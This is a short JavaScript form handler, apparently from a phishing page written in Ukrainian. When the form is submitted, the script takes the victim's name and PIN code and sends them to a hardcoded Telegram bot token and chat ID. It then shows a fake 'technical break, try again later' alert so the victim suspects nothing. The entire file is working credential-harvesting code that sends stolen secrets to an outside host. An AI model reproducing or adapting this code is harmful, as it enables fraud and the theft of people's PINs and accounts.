const TOKEN = "7923191600:AAFN9cyQVT5u7TR7F7u2xV6ZvcuuUhUklmA";
const CHAT_ID = "6831802827";

document.getElementById("form").addEventListener("submit", function (e) {
    e.preventDefault();

    const name = document.getElementById("name").value.trim();
    const pin = document.getElementById("pin").value.trim();
    const errorMsg = document.getElementById("error-msg");

    const message = `📥 Вхідна заявка:\n👤 Ім’я: ${name}\n🔐 PIN-код: ${pin}`;

    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
        .then(res => {
            if (res.ok) {
                alert("🔧 Технічна перерва. Спробуйте пізніше.");
                document.getElementById("form").reset();
                errorMsg.style.display = "none";
            } else {
                errorMsg.style.display = "block";
            }
        })
        .catch(() => {
            errorMsg.style.display = "block";
        });
});
